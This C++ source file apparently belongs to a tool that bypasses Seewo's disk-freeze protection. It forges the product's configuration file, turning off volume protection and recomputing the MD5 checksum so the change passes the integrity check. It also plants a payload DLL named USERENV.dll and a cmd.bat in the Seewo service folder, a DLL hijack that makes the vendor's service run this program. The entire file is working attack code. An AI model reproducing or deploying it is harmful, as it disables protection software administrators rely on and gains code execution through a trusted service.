#include "r3utils.hpp"

WCHAR configFilePath[] = L"C:\\ProgramData\\SeewoFreezeKernelConfig\\VolumeInfo.config";
WCHAR redirectFilePath[] = L"C:\\ProgramData\\SeewoFreezeKernelConfig\\redirect.config";
WCHAR dllFilePath[] = L"C:\\Program Files (x86)\\Seewo\\SeewoService\\SeewoHugoLauncher_installVer\\USERENV.dll";
WCHAR cmdFilePath[] = L"C:\\Program Files (x86)\\Seewo\\SeewoService\\SeewoHugoLauncher_installVer\\cmd.bat";
BYTE config[1024] = { 0 };
DWORD64 startSector = 0;
DWORD64 byteOffset = 0;

VOID GetMd5(BYTE* data, DWORD size, BYTE* md5_out) {
	MD5Context ctx;
	md5Init(&ctx);
	md5Update(&ctx, data, size);
	md5Finalize(&ctx);
	memcpy(md5_out, ctx.digest, 16);
}

BOOLEAN GenerateFreezeConfig(DWORD volumeProtected) {
	if (volumeProtected == -1) {
		((PFREEZE_CONFIG)config)->volumeProtected = -1;
		return TRUE;
	}

	printf("[*] Generating config file...\n");
	HANDLE hFile = CreateFile(configFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open config file for reading.\n");
		return FALSE;
	}

	DWORD fileSize = 1024;
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, config, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		CloseHandle(hFile);
		printf("[-] Failed to read config file.\n");
		return FALSE;
	}

	BYTE md5[16];
	GetMd5(config + 16, fileSize - 16, md5);
	if (memcmp(md5, config, 16) != 0) {
		CloseHandle(hFile);
		printf("[-] Config file integrity check failed. MD5 checksum does not match.\n");
		return FALSE;
	}

	PFREEZE_CONFIG _config = (PFREEZE_CONFIG)config;
	_config->volumeProtected = volumeProtected;
	_config->VolumeProtected2 = volumeProtected;
	GetMd5(config + 16, fileSize - 16, _config->md5);
	printf("[*] MD5 checksum updated.\n");

	CloseHandle(hFile);
	printf("[+] Config file generated successfully!\n");
	return TRUE;
}

BOOLEAN GetConfigFileSectorInfo() {
	HANDLE hFile = CreateFileW(configFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return 1;
	}

	STARTING_VCN_INPUT_BUFFER inputVcn = { 0 };
	BYTE outputBuffer[1024];
	DWORD bytesReturned;

	BOOL result = DeviceIoControl(
		hFile,
		FSCTL_GET_RETRIEVAL_POINTERS,
		&inputVcn, sizeof(inputVcn),
		&outputBuffer, sizeof(outputBuffer),
		&bytesReturned,
		NULL
	);

	if (!result) {
		CloseHandle(hFile);
		return 1;
	}

	PRETRIEVAL_POINTERS_BUFFER pPointers = (PRETRIEVAL_POINTERS_BUFFER)outputBuffer;

	LONGLONG startVcn = pPointers->StartingVcn.QuadPart;
	LONGLONG startLcn = pPointers->Extents[0].Lcn.QuadPart;
	LONGLONG nextVcn = pPointers->Extents[0].NextVcn.QuadPart;

	LONGLONG clusterCount = nextVcn - startVcn;

	DWORD sectorsPerCluster, bytesPerSector, freeClusters, totalClusters;
	GetDiskFreeSpaceW(L"C:\\", &sectorsPerCluster, &bytesPerSector, &freeClusters, &totalClusters);

	startSector = startLcn * sectorsPerCluster;
	byteOffset = clusterCount * sectorsPerCluster;

	CloseHandle(hFile);
	return 0;
}

BOOLEAN WriteConfigFile(BOOLEAN bypass) {
	HANDLE hFile = CreateFile(configFilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, bypass ? FILE_FLAG_SEQUENTIAL_SCAN : FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	DWORD fileSize = 1024;
	DWORD bytesWritten = 0;
	if (!WriteFile(hFile, config, fileSize, &bytesWritten, NULL) || bytesWritten != fileSize) {
		CloseHandle(hFile);
		printf("[-] Fail to write config file.\n");
		return FALSE;
	}
	FlushFileBuffers(hFile);
	CloseHandle(hFile);
	printf("[+] Successfully written to configuration file!\n");
	return TRUE;
}

BOOLEAN InitRedirectFile() {
	HANDLE hFile = CreateFile(redirectFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create redirect file.\n");
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

BOOLEAN InitDllFile(DWORD volume) {
	HANDLE hDllFile = CreateFile(dllFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDllFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create dll file.");
		return FALSE;
	}

	DWORD bytesWritten = 0;
	if (!WriteFile(hDllFile, raw_dll, sizeof(raw_dll), &bytesWritten, NULL) || bytesWritten != sizeof(raw_dll)) {
		CloseHandle(hDllFile);
		printf("[-] Fail to write dll file.\n");
		return FALSE;
	}
	CloseHandle(hDllFile);

	HANDLE hCmdFile = CreateFile(cmdFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCmdFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create cmdline file");
		return FALSE;
	}

	CHAR cmdline[MAX_PATH + 5 + 26 * 2 * sizeof(CHAR) + 1] = { 0 };
	PCHAR ptr = cmdline;

	DWORD pathLen = GetModuleFileNameA(NULL, cmdline, sizeof(cmdline));
	ptr += pathLen;
	if (pathLen == 0) {
		printf("[-] Failed to get file path.");
		return FALSE;
	}

	RtlCopyMemory(ptr, " flt ", 5);
	ptr += 5;

	for (int i = 0; i < 26; i++) {
		if (volume & 1llu << i) {
			*ptr = 'A' + i;
			ptr++;
			*ptr = ' ';
			ptr++;
		}
	}
	*ptr = '\x00';

	bytesWritten = 0;
	if (!WriteFile(hCmdFile, cmdline, sizeof(cmdline), &bytesWritten, NULL) || bytesWritten != sizeof(cmdline)) {
		CloseHandle(hCmdFile);
		printf("[-] Fail to write cmdline file.\n");
		return FALSE;
	}
	CloseHandle(hCmdFile);

	return TRUE;
}

BOOLEAN DeleteDllFile() {
	if (!DeleteFile(dllFilePath)) {
		return FALSE;
	}

	if (!DeleteFile(cmdFilePath)) {
		return FALSE;
	}

	return TRUE;
}